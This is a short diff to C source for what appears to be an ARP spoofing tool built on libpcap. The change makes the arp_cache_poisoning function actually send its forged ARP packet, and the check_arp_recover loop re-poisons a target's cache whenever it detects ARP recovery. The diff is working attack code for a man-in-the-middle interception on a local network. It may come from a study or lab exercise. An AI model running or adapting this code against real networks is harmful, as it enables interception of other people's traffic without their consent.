@@ -96,14 +96,14 @@ void get_mac_addr(pcap_t* handle, EthArpPacket *packet, Mac *sm, Ip si, Mac mm, 
 }
 
 int arp_cache_poisoning(pcap_t* handle, EthArpPacket *packet, Mac sm, Ip si, Mac tm, Ip ti, Mac mm) {
-	return make_packet(packet, sm, mm, mm, ti, sm, si, 0);
+	make_packet(packet, sm, mm, mm, ti, sm, si, 0);
+	return send_packet(handle, packet, sizeof(EthArpPacket));
 }
 
 
 int check_arp_recover(pcap_t* handle, EthArpPacket *packet , Mac *sm, Ip *si, Mac *tm, Ip *ti, Mac mm, int cnt) {
 	for(int i=0; i<=cnt; i++) {
 		if((ntohl(packet->arp_.tip_) == si[i]) && (ntohl(packet->arp_.tip_) == ti[i]) || (ntohl(packet->arp_.tip_) == ti[i]) && (ntohl(packet->arp_.tip_) == si[i])) {
-			
 			for(int j=0; j<5; j++) {
 				if(!(arp_cache_poisoning(handle, packet, sm[i], si[i], tm[i], ti[i], mm))) return 0;
 			}
